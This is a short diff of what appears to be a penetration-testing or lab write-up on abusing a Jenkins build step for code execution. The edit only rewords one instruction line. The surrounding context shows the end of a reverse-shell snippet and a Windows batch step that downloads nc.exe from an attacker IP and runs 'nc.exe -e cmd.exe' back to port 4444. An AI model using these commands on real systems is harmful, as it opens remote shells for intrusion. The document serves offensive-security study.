@@ -315,8 +315,7 @@ p.destroy();
 s.close();
 ```
 
-Or, go to "New Item", enter an item name, and add a build step. For example, it can be "execute Windows batch command" \ 
-Link: https://eternallybored.org/misc/netcat/
+Or, go to "New Item", enter an item name, and add a build step. For example, it can be "execute Windows batch command". Then hit build now.
 ```
 powershell wget "http://10.10.15.150:8000/nc.exe" -outfile "nc.exe"
 nc.exe -e cmd.exe 10.10.15.150 4444
